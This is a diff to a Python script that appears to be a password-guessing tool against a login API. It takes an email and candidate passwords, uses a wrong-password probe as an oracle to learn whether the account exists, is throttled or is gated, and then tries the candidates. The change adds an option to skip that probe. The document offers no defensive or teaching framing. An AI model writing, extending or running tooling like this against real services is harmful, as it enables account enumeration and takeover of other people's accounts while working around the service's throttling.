@@ -59,28 +59,35 @@ def main():
         sys.exit(1)
     em = sys.argv[1]
     pwds = [p for p in sys.argv[2].split(",") if p][:3]
+    skip_oracle = bool(pwds and pwds[0] == "__SKIPORACLE__")
+    if skip_oracle:
+        pwds = pwds[1:]
     c = Client()
-    print("[*] base=%s appid=%r isAdmin=%s email=%s" % (BASE, APPID, ISADMIN, em), flush=True)
+    print("[*] base=%s appid=%r isAdmin=%s email=%s skip_oracle=%s" % (
+        BASE, APPID, ISADMIN, em, skip_oracle), flush=True)
     c.fetch_key()
     print("[*] key ok KeyId=%s" % c.key_id, flush=True)
 
-    # 1) oracle with a random wrong pwd
-    oracle = "WrongPwd%d!" % random.randint(10000, 99999)
-    r0, _ = do_login(c, em, oracle)
-    rc0 = str(r0.get("ErrCode"))
-    msg0 = str(r0.get("ErrMsg") or "")
-    if "4047" in rc0:
-        print("[!] throttled - STOP", flush=True)
-        sys.exit(0)
-    if "not registered" in msg0.lower() or "unregistered" in msg0.lower():
-        print("STATUS NOT_REGISTERED", flush=True)
-        print("[*] done", flush=True)
-        return
-    if rc0 in ("4041", "4042"):
-        print("STATUS GATED (email-code gate, no pwd signal)", flush=True)
-        print("[*] done", flush=True)
-        return
-    print("STATUS CHECKABLE", flush=True)
+    if skip_oracle:
+        print("STATUS CHECKABLE (assumed, oracle skipped)", flush=True)
+    else:
+        # 1) oracle with a random wrong pwd
+        oracle = "WrongPwd%d!" % random.randint(10000, 99999)
+        r0, _ = do_login(c, em, oracle)
+        rc0 = str(r0.get("ErrCode"))
+        msg0 = str(r0.get("ErrMsg") or "")
+        if "4047" in rc0:
+            print("[!] throttled - STOP", flush=True)
+            sys.exit(0)
+        if "not registered" in msg0.lower() or "unregistered" in msg0.lower():
+            print("STATUS NOT_REGISTERED", flush=True)
+            print("[*] done", flush=True)
+            return
+        if rc0 in ("4041", "4042"):
+            print("STATUS GATED (email-code gate, no pwd signal)", flush=True)
+            print("[*] done", flush=True)
+            return
+        print("STATUS CHECKABLE", flush=True)
 
     # 2) try candidate pwds
     for i, pwd in enumerate(pwds):
